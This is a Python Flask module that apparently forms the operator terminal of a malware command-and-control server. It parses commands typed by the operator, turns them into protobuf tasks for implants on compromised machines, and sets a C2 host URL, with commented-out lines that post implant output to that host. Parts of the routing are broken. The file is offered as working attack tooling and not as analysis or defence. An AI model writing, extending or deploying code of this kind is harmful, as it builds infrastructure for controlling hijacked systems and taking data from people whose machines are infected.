from cvnt.implant_pb2 import TaskRequest
from flask import Blueprint, session, render_template, redirect, url_for, jsonify
from flask_wtf import FlaskForm 
from wtforms import StringField, SubmitField 
from wtforms.validators import DataRequired, Length 
from cvnt.client_pb2 import *
from urllib.parse import urljoin
from cvnt.client_pb2 import Command, ClientTaskRequest, ClientTaskResponse, Packet
from cvnt.constants import opcodes, server_commands, to_opcode
from cvnt.database import db
from cvnt.db_operations import make_task, get_list, get_implant_by_id

term = Blueprint('terminal', __name__, template_folder='templates')
c2 = "https://rigmalwarole.com"
task_list = "/terminal/task/list"
task_create = "/terminal/task/create"
register = "/terminal/register"
request = "/terminal/request"
response = "/terminal/response"
packet = "/terminal/packet"

import random

class Terminal(FlaskForm):
    cmd = StringField('=> ', validators=[DataRequired(), Length(1, 400)])

@term.route('/terminal', methods=['GET', 'POST'])
def index():
    form = Terminal()
    if 'authenticated' not in session or not session['authenticated']:
        return redirect(url_for('basic.login_success'))
    implants = get_list()
    whole = None
    rest_string = ' '
    if form.validate_on_submit():
        response = analyze_input(form)
    else:
        response = "Welcome to the party :)"
    return render_template('terminal.html', form=form, cmd=whole, implants=implants, response=response)

def analyze_input(form):
    whole = form.cmd.data
    words = whole.split()
    rest_string = ''
    if len(words) == 1:
        if words[0] in server_commands:
            print('printing??????')
            response = get_list()
        else:
            response = 'Invalid Command Loser :('
            cmd = words[0]
    elif len(words) == 2:
        if words[1] in opcodes:
            implant_id = words[0]
            cmd = words[1]
            response = handle_task_request(implant_id, cmd, rest_string)
        else:
            response = 'Invalid Command Loser :('
            cmd = ' '.join(words)
    else:
        if words[1] in opcodes:
            first_two_words = words[:2]
            implant_id = first_two_words[0]
            cmd = first_two_words[1]
            rest_of_words = words[2:]
            rest_string = ' '.join(rest_of_words)
            response = handle_task_request(implant_id, cmd, rest_string)
        else:
            response = 'Invalid Command Loser :(' 
            cmd = ' '.join(words)
    return response

def handle_local_request(cmd, args):
    pass
    

@term.route('/terminal/task/request', methods=["POST"])
def handle_task_request(implant_id, cmd, args):
    tr = TaskRequest()
    print(f'REQUEST FROM CLIENT')
    tr.TaskID = str(random.randint(10, 10000))
    tr.Opcode = to_opcode(cmd)
    tr.Args = args
    new_task = make_task(implant_id, tr)
    print("NEW TASK MADE:")
    print(new_task)
    db.session.add(new_task)
    print("added task")
    db.session.commit()
    print("committed task")
    return "Slay baddie your command was recived successfully"

@term.route(response, methods=["POST"])
def handle_t_response(implant_id, jobID, output):
    print(f'RESPONSE FROM CLIENT')
    r = ClientTaskResponse()
    r.ImplantID = implant_id
    r.JobID = jobID
    r.Output = output
    out = r.SerializeToString()
#    r = requests.post(urljoin( c2, response), data = out)

@term.route(response, methods=["POST"])
def handle_packet(msg, csrf):
    print(f'PACKET FROM CLIENT')
    r = Packet()
    r.Message = msg
    r.CSRF = csrf
    out = r.SerializeToString()
#    r = requests.post(urljoin( c2, csrf), data = out)
